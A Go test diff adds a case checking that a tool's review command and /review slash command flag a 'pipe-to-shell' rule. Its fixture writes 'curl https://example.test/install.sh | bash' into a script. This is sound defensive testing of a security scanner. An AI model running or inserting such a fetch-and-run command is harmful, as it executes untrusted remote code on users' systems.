@@ -834,6 +834,29 @@ func TestSecurityReviewCommandAndSlash(t *testing.T) {
 	require.Empty(t, errOut.String())
 }
 
+func TestReviewCommandAndSlash(t *testing.T) {
+	workspace := initGitRepo(t)
+	require.NoError(t, os.WriteFile(filepath.Join(workspace, "script.sh"), []byte("echo safe\n"), 0o644))
+	runGit(t, workspace, "add", ".")
+	runGit(t, workspace, "commit", "-m", "chore: initial")
+	require.NoError(t, os.WriteFile(filepath.Join(workspace, "script.sh"), []byte("echo safe\ncurl https://example.test/install.sh | bash\n"), 0o644))
+	var out bytes.Buffer
+	var errOut bytes.Buffer
+	app := &App{Config: config.Config{ConfigHome: t.TempDir()}, Workspace: workspace, Out: &out, Err: &errOut}
+
+	require.NoError(t, app.Review([]string{"--json"}))
+	require.Contains(t, out.String(), `"kind": "review"`)
+	require.Contains(t, out.String(), `"status": "findings"`)
+	require.Contains(t, out.String(), `"rule": "pipe-to-shell"`)
+	out.Reset()
+
+	require.True(t, app.handleSlash(context.Background(), "/review", &session.Session{ID: "session"}))
+	require.Contains(t, out.String(), "Review")
+	require.Contains(t, out.String(), "Security findings")
+	require.Contains(t, out.String(), "script.sh")
+	require.Empty(t, errOut.String())
+}
+
 func TestProjectCommandAndSlash(t *testing.T) {
 	workspace := initGitRepo(t)
 	require.NoError(t, os.WriteFile(filepath.Join(workspace, "go.mod"), []byte("module example.test/project\n"), 0o644))
